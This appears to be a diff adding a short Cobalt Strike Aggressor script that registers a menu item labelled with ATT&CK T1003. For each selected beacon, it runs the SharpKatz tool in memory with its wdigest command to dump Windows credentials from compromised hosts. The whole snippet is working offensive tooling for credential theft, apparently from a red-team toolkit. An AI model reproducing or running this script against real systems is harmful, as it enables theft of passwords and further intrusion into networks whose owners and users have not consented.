@@ -1,0 +1,14 @@
+item "SharpKatz WDigest Credentials  - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			skwdigest($bid);
+		}
+	}
+	
+	
+sub skwdigest{
+
+bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command wdigest");
+
+}
+	
